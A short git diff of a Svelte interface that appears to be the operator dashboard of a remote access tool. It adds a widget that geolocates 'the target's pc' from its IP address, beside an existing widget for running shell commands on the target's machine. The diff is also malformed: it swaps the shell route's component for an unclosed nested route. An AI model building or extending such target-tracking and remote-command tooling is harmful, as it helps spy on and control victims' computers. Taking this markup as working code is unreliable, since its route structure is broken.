@@ -6,6 +6,7 @@
   import { secondsToString } from '../util';
   import Widget from '../Widget.svelte';
   import Shell from './widgets/Shell.svelte';
+  import Locate from './widgets/Locate.svelte';
 
   const params = useParams();
 
@@ -43,11 +44,17 @@
             description="Write shell commands that will run on the target's pc. Unavailable on Unix-based OS (who the hell uses Linux anyway)."
             icon="/assets/cli.svg"
           />
+          <Widget
+            title="Locate"
+            description="Get the coordinates of the target's pc from its IP address."
+            icon="/assets/marker.svg"
+          />
         </div>
       </Route>
 
       <Route path="shell">
-        <Shell id={$params.id} />
+      <Route>
+        <Locate {socket} />
       </Route>
     {/if}
   </main>
